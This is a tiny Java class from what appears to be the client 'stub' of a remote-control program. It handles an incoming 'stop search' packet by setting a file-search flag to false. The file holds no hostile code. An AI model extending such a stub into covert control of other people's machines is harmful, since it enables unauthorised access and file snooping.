package com.redpois0n.stub.packets.incoming;

import com.redpois0n.stub.FileSearch;

public class Packet54StopSearch extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		FileSearch.running = false;
	}

}
